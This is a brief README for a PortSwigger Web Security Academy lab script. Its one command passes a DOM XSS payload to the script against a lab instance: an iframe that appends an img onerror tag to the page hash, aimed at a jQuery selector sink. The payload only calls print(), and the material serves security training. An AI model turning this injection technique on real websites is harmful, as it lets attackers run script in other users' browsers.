# How to run script.py

### DOM XSS in jQuery selector sink using a hashchange event

No proxy:
- `python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" -c "<iframe src=\"https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net#\" onload=\"this.src+='<img src=1 onerror=print(1)>'\">"`
